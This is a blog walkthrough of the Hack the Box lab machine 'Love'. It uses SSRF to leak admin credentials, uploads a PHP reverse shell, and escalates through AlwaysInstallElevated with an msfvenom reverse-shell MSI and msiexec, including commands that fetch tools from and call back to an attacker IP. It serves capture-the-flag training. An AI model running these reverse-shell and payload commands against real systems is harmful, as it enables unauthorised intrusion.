+++
author = "Nick"
categories = ["hack the box", "easy", "windows", "reverse shell", "AlwaysInstallElevated", "msfvenom"]
date = 2021-08-07T15:00:00Z
description = ""
draft = false
thumbnail = "/images/2021/05/love.png"
slug = "hack-the-box-love"
summary = "Welcome back! Today we are going to be doing the Hack the Box machine - Love. This is listed as an Easy Windows machine. Let's jump in.\n"
tags = ["hack the box", "easy", "windows", "reverse shell", "AlwaysInstallElevated", "msfvenom"]
title = "Hack the Box - Love"

+++


Welcome back! Today we are going to be doing the Hack the Box machine - Love. This is listed as an Easy Windows machine. Let's jump in.

As always, we kick it off with `nmap`.

Here are our results:
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, X11Probe: 
|_    Host '10.10.14.125' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-05-18T18:25:43+00:00; +32m45s from scanner time.
| tls-alpn: 
|_  http/1.1
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=5/18%Time=60A3FE4D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.125'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.125'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h17m46s, deviation: 3h30m02s, median: 32m44s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-18T11:25:33-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-18T18:25:30
|_  start_date: N/A
```

One of the first things we see is the DNS name given as `love.htb` and `staging.love.htb`. So we'll add this to our hosts list. Next we'll head over to see what's being hosted on port 80. We see a voting system. Next we check port 5000, nothing, it's forbidden. Next up is port 5040, nothing, it just times out. We check out `love.htb` on port 443, also forbidden. Now we'll head over to see what's being hosted on `staging.love.htb`.

When we land on this virtual host, we see a file scanning service. WE even have the option to demo the software. The page is asking for a URL to scan. So we setup a `netcat` listener on our local machine and point it to that URL.

![](/images/2021/05/image-35.png)

Interesting. So, to test this further, we can create a file and see what happens when the URL is a file. We simple create a file with touch, populate it with junk data and host it. We then use the demo to read the file and get whatever it might tell us about the file.

Commands:
`touch 1.lst`
`echo 'hi' > 1.lst`
`simple` (This is an alias'd to `SimpleHTTPServer` for me)

![](/images/2021/05/love_test.gif)

So we know that it will read the contents of whatever the item we supply is. So my thought here is to let this demo read the pages that were forbidden to us earlier. If the server is trying to query itself, it's likley we won't get forbidden. Port 443 didn't yield anything, however port 5000 did!

![](/images/2021/05/image-36.png)

Awesome, we have some credentials `admin`:`@LoveIsInTheAir!!!!`. Now we need to identify where we can use them. They don't work in the standard entry form. To dig a bit more we'll use `gobuster` to help enumerate more.

Command:
`gobuster dir -u http://love.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

We find an `admin` directory.

![](/images/2021/05/image-37.png)

Awesome, the credentials work on this interface! Once we're in the admin portal, we look around for additional ways to pivot. After looking around, it seems like uploading a shell as a user profile picture could be a valid method. There are many `php shells` out there, pick one you [like](https://github.com/pentestmonkey/php-reverse-shell).

![](/images/2021/05/love_shell.gif)

We setup our listen and catch a connection back immediately. We then navigate to `Phoebe`'s Desktop and snag the `user.txt` flag! Awesome, now it's time to start enumerating so we can find a path forward. We'll spin up a `SimpleHTTPServer` and transfer over `winPEAS`. A quick check shows we have `curl` on the system, we'll use that to get our file.

Command:
`curl http://10.10.14.125/winPEAS.bat -o wp.bat`

![](/images/2021/05/image-39.png)

That takes quite a while to run, but after sifting through the results, it looks like we can use `AlwaysInstallElevated` to [escalate](https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path).

First we'll generate a payload via `msfvenom`.

Command:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.125 LPORT=6969 -f msi -o rootme.msi`

Once that is generated, we can host it via `SimpleHTTPServer` and download it onto the target. Once its on the system, we run the following command.

Command:
`msiexec /quiet /qn /i C:\Users\Phoebe\Downloads\rm.msi`

![](/images/2021/05/image-38.png)

We catch a shell back as `system`! Let's get the `root.txt` flag and we have completed the box!



